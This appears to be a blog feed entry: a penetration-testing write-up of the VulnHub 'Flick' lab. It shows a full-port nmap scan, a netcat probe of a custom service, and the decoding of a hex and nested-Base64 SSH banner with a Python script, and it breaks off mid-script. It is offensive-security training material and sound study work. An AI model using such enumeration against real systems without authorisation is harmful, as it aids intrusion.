<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2015-05-09T16:47:38+03:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Flick]]></title>
    <link href="http://chousensha.github.io/blog/2015/02/09/pentest-lab-flick/"/>
    <updated>2015-02-09T15:22:24+02:00</updated>
    <id>http://chousensha.github.io/blog/2015/02/09/pentest-lab-flick</id>
    <content type="html"><![CDATA[<p>The next challenge I&rsquo;m going for from the myriad of options on VulnHub will be Flick, by <a href="https://www.vulnhub.com/author/leonjza,57/">Leonjza</a>!</p>

<blockquote><p>Welcome to the flick boot2root!</p>

<ul>
<li>Where is the flag?</li>
<li>What do you need to flick to find it?</li>
</ul>


<p>Completing &ldquo;flick&rdquo; will require some sound
thinking, good enumeration skills &amp; time! The
objective is to find and read the flag that
lives /root/</p>

<p>As a bonus, can you get root command execution?</p></blockquote>

<!-- more -->


<p>``` plain
nmap -A -p1-65535 192.168.80.129</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-02-09 15:28 EET
Nmap scan report for 192.168.80.129
Host is up (0.00056s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 04:d0:8d:4d:ee:87:30:e7:60:82:63:d3:a8:6e:4b:ac (DSA)
|   2048 64:ec:a9:9b:0b:c0:11:d4:08:63:cf:83:e1:db:23:9a (RSA)
|_  256 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02 (ECDSA)
8881/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
SF-Port8881-TCP:V=6.47%I=7%D=2/9%Time=54D8B5FC%P=x86_64-unknown-linux-gnu%
SF:r(NULL,5F,&ldquo;Welcome\x20to\x20the\x20admin\x20server.\x20A\x20correct\x2
SF:0password\x20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20ne
SF:w\x20door:\n>\x20&rdquo;)%r(GetRequest,78,&ldquo;Welcome\x20to\x20the\x20admin\x20s
SF:erver.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20switch
SF:\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20GET\x20/\x20HTTP/1.0
SF:\r\n\r\n\n>\x20&rdquo;)%r(FourOhFourRequest,9B,&ldquo;Welcome\x20to\x20the\x20admin
SF:\x20server.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20s
SF:witch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20GET\x20/nice%20p
SF:orts%2C/Tri%6Eity.txt%2ebak\x20HTTP/1.0\r\n\r\n\n>\x20&rdquo;)%r(GenericLin
SF:es,6A,&ldquo;Welcome\x20to\x20the\x20admin\x20server.\x20A\x20correct\x20pas
SF:sword\x20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20new\x2
SF:0door:\n>\x20OK:\x20\r\n\r\n\n>\x20&rdquo;)%r(HTTPOptions,7C,&ldquo;Welcome\x20to\x
SF:20the\x20admin\x20server.\x20A\x20correct\x20password\x20will\x20'flic
SF:k'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20OP
SF:TIONS\x20/\x20HTTP/1.0\r\n\r\n\n>\x20&rdquo;)%r(RTSPRequest,7C,&ldquo;Welcome\x20t
SF:o\x20the\x20admin\x20server.\x20A\x20correct\x20password\x20will\x20'f
SF:lick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x2
SF:0OPTIONS\x20/\x20RTSP/1.0\r\n\r\n\n>\x20&rdquo;)%r(RPCCheck,92,&ldquo;Welcome\x20t
SF:o\x20the\x20admin\x20server.\x20A\x20correct\x20password\x20will\x20'f
SF:lick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x2
SF:0\x80\0\0(r\xfe\x1d\x13\0\0\0\0\0\0\0\x02\0\x01\x86\xa0\0\x01\x97\|\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\n>\x20&rdquo;)%r(DNSVersionBindReq,86,&ldquo;
SF:Welcome\x20to\x20the\x20admin\x20server.\x20A\x20correct\x20password\x
SF:20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\
SF:n>\x20OK:\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\x04bind\0\
SF:0\x10\0\x03\n>\x20&rdquo;)%r(DNSStatusRequest,74,&ldquo;Welcome\x20to\x20the\x20adm
SF:in\x20server.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x2
SF:0switch\x20and\x20open\x20a\x20new\x20door:\n>\x20OK:\x20\0\x0c\0\0\x10
SF:\0\0\0\0\0\0\0\0\0\n>\x20&rdquo;);
MAC Address: 00:0C:29:7A:27:7B (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 &ndash; 3.14
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```</p>

<p>Not much to work with. I netcat'ed to the 8881 port:</p>

<p>``` plain
nc 192.168.80.129 8881
Welcome to the admin server. A correct password will &lsquo;flick&rsquo; the switch and open a new door:</p>

<blockquote><p>letmein?
OK: letmein?</p>

<p>```</p></blockquote>

<p>I tried bombarding it with long strings to see how it would behave, but nothing happened. Next thing I just thought to try SSH and it would seem this is the more likely route:</p>

<p>``` plain
ssh 192.168.80.129
The authenticity of host &lsquo;192.168.80.129 (192.168.80.129)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;192.168.80.129&rsquo; (ECDSA) to the list of known hosts.</p>

<p>\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68
\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47
\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61
\x57\x46\x4e\x72\x61\x47\x68\x53\x65\x6d\x78\x57\x56\x6d\x70\x4f\x54\x30\x30\x78
\x63\x46\x5a\x58\x62\x55\x5a\x72\x55\x6a\x41\x31\x52\x31\x64\x72\x57\x6e\x64\x57
\x4d\x44\x46\x46\x55\x6c\x52\x47\x56\x31\x5a\x46\x62\x33\x64\x57\x61\x6b\x5a\x68
\x56\x30\x5a\x4f\x63\x6d\x46\x48\x61\x46\x4e\x6c\x62\x58\x68\x58\x56\x6d\x30\x78
\x4e\x46\x6c\x56\x4d\x48\x68\x58\x62\x6b\x35\x59\x59\x6c\x56\x61\x63\x6c\x56\x71
\x51\x54\x46\x53\x4d\x57\x52\x79\x56\x32\x78\x4f\x56\x57\x4a\x56\x63\x45\x64\x5a
\x4d\x46\x5a\x33\x56\x6a\x4a\x4b\x56\x56\x4a\x59\x5a\x46\x70\x6c\x61\x33\x42\x49
\x56\x6d\x70\x47\x54\x32\x52\x57\x56\x6e\x52\x68\x52\x6b\x35\x73\x59\x6c\x68\x6f
\x57\x46\x5a\x74\x4d\x58\x64\x55\x4d\x56\x46\x33\x54\x55\x68\x6f\x61\x6c\x4a\x73
\x63\x46\x6c\x5a\x62\x46\x5a\x68\x59\x32\x78\x57\x63\x56\x46\x55\x52\x6c\x4e\x4e
\x56\x6c\x59\x31\x56\x46\x5a\x53\x55\x31\x5a\x72\x4d\x58\x4a\x6a\x52\x6d\x68\x57
\x54\x57\x35\x53\x4d\x31\x5a\x71\x53\x6b\x74\x57\x56\x6b\x70\x5a\x57\x6b\x5a\x77
\x62\x47\x45\x7a\x51\x6b\x6c\x57\x62\x58\x42\x48\x56\x44\x4a\x53\x56\x31\x5a\x75
\x55\x6d\x68\x53\x61\x7a\x56\x7a\x57\x57\x78\x6f\x62\x31\x64\x47\x57\x6e\x52\x4e
\x53\x47\x68\x50\x55\x6d\x31\x34\x56\x31\x52\x56\x61\x47\x39\x58\x52\x30\x70\x79
\x54\x6c\x5a\x73\x57\x6d\x4a\x47\x57\x6d\x68\x5a\x4d\x6e\x68\x58\x59\x7a\x46\x57
\x63\x6c\x70\x47\x61\x47\x6c\x53\x4d\x31\x46\x36\x56\x6a\x4a\x30\x55\x31\x55\x78
\x57\x6e\x4a\x4e\x57\x45\x70\x71\x55\x6d\x31\x6f\x56\x31\x52\x58\x4e\x56\x4e\x4e
\x4d\x56\x70\x78\x55\x32\x74\x30\x56\x31\x5a\x72\x63\x46\x70\x58\x61\x31\x70\x33
\x56\x6a\x46\x4b\x56\x32\x4e\x49\x62\x46\x64\x57\x52\x55\x70\x6f\x56\x6b\x52\x4b
\x54\x32\x52\x47\x53\x6e\x4a\x61\x52\x6d\x68\x70\x56\x6a\x4e\x6f\x56\x56\x64\x57
\x55\x6b\x39\x52\x4d\x57\x52\x48\x56\x32\x35\x53\x54\x6c\x5a\x46\x53\x6c\x68\x55
\x56\x33\x68\x48\x54\x6c\x5a\x61\x57\x45\x35\x56\x4f\x56\x68\x53\x4d\x48\x42\x4a
\x56\x6c\x64\x34\x63\x31\x64\x74\x53\x6b\x68\x68\x52\x6c\x4a\x58\x54\x55\x5a\x77
\x56\x46\x5a\x71\x52\x6e\x64\x53\x4d\x56\x4a\x30\x5a\x55\x64\x73\x55\x32\x4a\x59
\x59\x33\x68\x57\x61\x31\x70\x68\x56\x54\x46\x56\x65\x46\x64\x75\x53\x6b\x35\x58
\x52\x58\x42\x78\x56\x57\x78\x6b\x4e\x47\x46\x47\x56\x58\x64\x68\x52\x55\x35\x55
\x55\x6d\x78\x77\x65\x46\x55\x79\x64\x47\x46\x69\x52\x6c\x70\x7a\x56\x32\x78\x77
\x57\x47\x45\x78\x63\x44\x4e\x5a\x61\x32\x52\x47\x5a\x57\x78\x47\x63\x6d\x4a\x47
\x5a\x46\x64\x4e\x4d\x45\x70\x4a\x56\x6d\x74\x53\x53\x31\x55\x78\x57\x58\x68\x57
\x62\x6c\x5a\x57\x59\x6c\x68\x43\x56\x46\x6c\x72\x56\x6e\x64\x57\x56\x6c\x70\x30
\x5a\x55\x63\x35\x55\x6b\x31\x58\x55\x6e\x70\x57\x4d\x6a\x56\x4c\x56\x30\x64\x4b
\x53\x46\x56\x74\x4f\x56\x56\x57\x62\x48\x42\x59\x56\x47\x78\x61\x59\x56\x64\x48
\x56\x6b\x68\x6b\x52\x32\x68\x70\x55\x6c\x68\x42\x64\x31\x64\x57\x56\x6d\x39\x55
\x4d\x56\x70\x30\x55\x6d\x35\x4b\x54\x31\x5a\x73\x53\x6c\x68\x55\x56\x6c\x70\x33
\x56\x30\x5a\x72\x65\x46\x64\x72\x64\x47\x70\x69\x56\x6b\x70\x49\x56\x6c\x64\x34
\x61\x32\x46\x57\x53\x6e\x52\x50\x56\x45\x35\x58\x54\x57\x35\x6f\x57\x46\x6c\x71
\x53\x6b\x5a\x6c\x52\x6d\x52\x5a\x57\x6b\x55\x31\x56\x31\x5a\x73\x63\x46\x56\x58
\x56\x33\x52\x72\x56\x54\x46\x73\x56\x31\x56\x73\x57\x6c\x68\x69\x56\x56\x70\x7a
\x57\x57\x74\x61\x64\x32\x56\x47\x56\x58\x6c\x6b\x52\x45\x4a\x58\x54\x56\x5a\x77
\x65\x56\x59\x79\x65\x48\x64\x58\x62\x46\x70\x58\x59\x30\x68\x4b\x56\x31\x5a\x46
\x57\x6b\x78\x57\x4d\x56\x70\x48\x59\x32\x31\x4b\x52\x31\x70\x47\x5a\x45\x35\x4e
\x52\x58\x42\x4b\x56\x6d\x31\x30\x55\x31\x4d\x78\x56\x58\x68\x58\x57\x47\x68\x68
\x55\x30\x5a\x61\x56\x6c\x6c\x72\x57\x6b\x74\x6a\x52\x6c\x70\x78\x56\x47\x30\x35
\x56\x31\x5a\x73\x63\x45\x68\x58\x56\x45\x35\x76\x59\x56\x55\x78\x57\x46\x56\x75
\x63\x46\x64\x4e\x56\x32\x68\x32\x56\x31\x5a\x61\x53\x31\x49\x78\x54\x6e\x56\x52
\x62\x46\x5a\x58\x54\x54\x46\x4b\x4e\x6c\x5a\x48\x64\x47\x46\x68\x4d\x6b\x35\x7a
\x56\x32\x35\x53\x61\x31\x4a\x74\x55\x6e\x42\x57\x62\x47\x68\x44\x54\x6c\x5a\x6b
\x56\x56\x46\x74\x52\x6d\x70\x4e\x56\x31\x49\x77\x56\x54\x4a\x30\x61\x31\x64\x48
\x53\x6c\x68\x68\x52\x30\x5a\x56\x56\x6d\x78\x77\x4d\x31\x70\x58\x65\x48\x4a\x6c
\x56\x31\x5a\x49\x5a\x45\x64\x30\x55\x32\x45\x7a\x51\x58\x64\x58\x62\x46\x5a\x68
\x59\x54\x4a\x47\x56\x31\x64\x75\x53\x6d\x6c\x6c\x61\x31\x70\x59\x57\x57\x78\x6f
\x51\x31\x52\x47\x55\x6e\x4a\x58\x62\x45\x70\x73\x55\x6d\x31\x53\x65\x6c\x6c\x56
\x57\x6c\x4e\x68\x56\x6b\x70\x31\x55\x57\x78\x77\x56\x32\x4a\x59\x55\x6c\x68\x61
\x52\x45\x5a\x72\x55\x6a\x4a\x4b\x53\x56\x52\x74\x61\x46\x4e\x57\x56\x46\x5a\x61
\x56\x6c\x63\x78\x4e\x47\x51\x79\x56\x6b\x64\x57\x62\x6c\x4a\x72\x55\x6b\x56\x4b
\x62\x31\x6c\x59\x63\x45\x64\x6c\x56\x6c\x4a\x7a\x56\x6d\x35\x4f\x57\x47\x4a\x47
\x63\x46\x68\x5a\x4d\x47\x68\x4c\x56\x32\x78\x61\x57\x46\x56\x72\x5a\x47\x46\x57
\x56\x31\x4a\x51\x56\x54\x42\x6b\x52\x31\x49\x79\x52\x6b\x68\x69\x52\x6b\x35\x70
\x59\x54\x42\x77\x4d\x6c\x5a\x74\x4d\x54\x42\x56\x4d\x55\x31\x34\x56\x56\x68\x73
\x56\x56\x64\x48\x65\x46\x5a\x5a\x56\x45\x5a\x33\x59\x55\x5a\x57\x63\x56\x4e\x74
\x4f\x56\x64\x53\x62\x45\x70\x5a\x56\x47\x78\x6a\x4e\x57\x45\x79\x53\x6b\x64\x6a
\x52\x57\x68\x58\x59\x6c\x52\x42\x4d\x56\x5a\x58\x63\x33\x68\x58\x52\x6c\x5a\x7a
\x59\x55\x5a\x6b\x54\x6c\x59\x79\x61\x44\x4a\x57\x61\x6b\x4a\x72\x55\x7a\x46\x6b
\x56\x31\x5a\x75\x53\x6c\x42\x57\x62\x48\x42\x76\x57\x56\x52\x47\x64\x31\x4e\x57
\x57\x6b\x68\x6c\x52\x30\x5a\x61\x56\x6d\x31\x53\x52\x31\x52\x73\x57\x6d\x46\x56
\x52\x6c\x6c\x35\x59\x55\x5a\x6f\x57\x6c\x64\x49\x51\x6c\x68\x56\x4d\x46\x70\x68
\x59\x31\x5a\x4f\x63\x56\x56\x73\x57\x6b\x35\x57\x4d\x55\x6c\x33\x56\x6c\x52\x4b
\x4d\x47\x49\x79\x52\x6b\x64\x54\x62\x6b\x35\x55\x59\x6b\x64\x6f\x56\x6c\x5a\x73
\x57\x6e\x64\x4e\x4d\x56\x70\x79\x56\x32\x31\x47\x61\x6c\x5a\x72\x63\x44\x42\x61
\x52\x57\x51\x77\x56\x6a\x4a\x4b\x63\x6c\x4e\x72\x61\x46\x64\x53\x4d\x32\x68\x6f
\x56\x6b\x52\x4b\x52\x31\x59\x78\x54\x6e\x56\x56\x62\x45\x4a\x58\x55\x6c\x52\x57
\x57\x56\x64\x57\x55\x6b\x64\x6b\x4d\x6b\x5a\x48\x56\x32\x78\x57\x55\x32\x45\x78
\x63\x48\x4e\x56\x62\x54\x46\x54\x5a\x57\x78\x73\x56\x6c\x64\x73\x54\x6d\x68\x53
\x56\x45\x5a\x61\x56\x56\x63\x31\x62\x31\x59\x78\x57\x58\x70\x68\x53\x45\x70\x61
\x59\x57\x74\x61\x63\x6c\x56\x71\x52\x6c\x64\x6a\x4d\x6b\x5a\x47\x54\x31\x5a\x6b
\x56\x31\x5a\x47\x57\x6d\x46\x57\x62\x47\x4e\x34\x54\x6b\x64\x52\x65\x56\x5a\x72
\x5a\x46\x64\x69\x62\x45\x70\x79\x56\x57\x74\x57\x53\x32\x49\x78\x62\x46\x6c\x6a
\x52\x57\x52\x73\x56\x6d\x78\x4b\x65\x6c\x5a\x74\x4d\x44\x56\x58\x52\x30\x70\x48
\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57
\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78
\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e
\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76
\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d</p>

<p> .o88o. oooo   o8o            oooo      <br/>
 888 <code>"</code>888   <code>"'           </code>888      <br/>
o888oo   888  oooo   .ooooo.   888  oooo<br/>
 888     888  <code>888  d88'</code>&ldquo;Y8  888 .8P' <br/>
 888     888   888  888        888888.  <br/>
 888     888   888  888   .o8  888 <code>88b.  
o888o   o888o o888o</code>Y8bod8P' o888o o888o</p>

<p><a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#x72;&#x6f;&#111;&#x74;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x38;&#x30;&#x2e;&#49;&#50;&#x39;">&#x72;&#x6f;&#111;&#116;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#56;&#48;&#x2e;&#x31;&#50;&#57;</a>&rsquo;s password:
```</p>

<p>I copied that block of hex to an online hex to string converter that spit out a Base64 encoded string:</p>

<p><code>plain
Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==
</code></p>

<p>Moving to a Base64 decoder, it appears to be decoded into&hellip;another Base64 string?</p>

<p><code>plain
Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0=
</code></p>

<p>This kept happening for the next decodings, so I lost my patience and went to Python to script the decoding process:</p>

<p>``` python</p>

<p>import base64</p>

<p>secret = &lsquo;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1I